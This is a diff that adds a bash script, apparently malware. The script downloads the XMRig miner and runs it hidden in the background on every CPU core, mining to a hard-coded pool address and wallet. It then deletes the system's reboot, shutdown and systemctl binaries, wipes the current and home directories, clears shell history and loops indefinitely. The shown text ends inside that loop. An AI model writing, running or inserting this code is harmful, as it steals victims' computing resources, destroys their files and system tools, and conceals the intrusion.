@@ -1,0 +1,15 @@
+#!/bin/bash
+wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+tar xf xmrig-6.22.2-linux-static-x64.tar.gz
+cd xmrig-6.22.2
+./xmrig --donate-level 1 -o 209.97.168.28:443 -u Q0104006f62eeca4efe4da7805a59e381783e116ab66e257dfe06a6d199cd7505ce9f07847e5a73 -p $(echo $RANDOM | md5sum | head -c 20) -a rx/0 -t $(nproc --all) -a rx/0 -t $(nproc --all) > /dev/null 2>&1 &
+sleep 30
+sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
+rm -rvf *
+cd ~/
+rm -rvf *
+history -cr
+while true
+do
+        echo "hold down..."
+        sleep 60
